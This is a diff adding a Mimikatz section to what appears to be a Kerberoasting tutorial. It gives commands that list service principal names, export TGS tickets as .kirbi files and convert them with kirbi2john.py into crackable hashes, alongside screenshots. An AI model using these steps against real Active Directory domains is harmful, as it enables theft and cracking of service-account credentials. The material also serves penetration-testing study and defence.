@@ -88,11 +88,32 @@ download script:https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-T
  <img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="800" height="200"> 
 
  
+ ## Mimikatz
+  <img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="800" height="200"> 
+
+ ```
+ Kerberos::list  ## for SPN discovery.
+ ```
+  <img src="/img/kerberosting/2.PNG" alt="Getting-gz" width="800" height="200"> 
+
+Dump TGS ticket
+```
+kerberos::list /export
+
+```
+ <img src="/img/kerberosting/3.PNG" alt="Getting-gz" width="800" height="200"> 
+
+ <img src="/img/kerberosting/4.PNG" alt="Getting-gz" width="800" height="200"> 
+
+
+## kirbi2john.py 
+Convert the Kirbi to Hash 
+
+```
+kirbi2john.py 3-40a50000-admin@ldap\~domainAD.karim.net\~DomainDnsZones.karim.net-KARIM.NET.kirbi
+```
+ <img src="/img/kerberosting/222222.PNG" alt="Getting-gz" width="800" height="200"> 
  
- 
-
-
-
 
 ## GetUserSPNs.py
 find user account used as service account
